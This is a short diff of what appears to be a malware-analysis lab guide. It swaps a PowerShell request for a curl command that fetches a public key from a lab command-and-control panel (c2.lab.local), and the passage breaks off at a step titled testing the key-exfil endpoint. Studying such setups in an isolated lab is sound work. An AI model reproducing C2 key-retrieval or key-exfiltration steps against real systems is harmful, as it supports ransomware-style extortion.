@@ -210,18 +210,10 @@ ls -l \
 From the Windows analysis VM, retrieve the public key:
 
 ```powershell
-$response = Invoke-WebRequest `
-    http://c2.lab.local/panel/publickey
-
-$response.StatusCode
-$response.Content
+curl http://c2.lab.local/panel/publickey
 ```
 
-Expected status:
-
-```text
-200
-```
+Confirm the response matches the RSA public key. 
 
 Test the key-exfil endpoint:
 
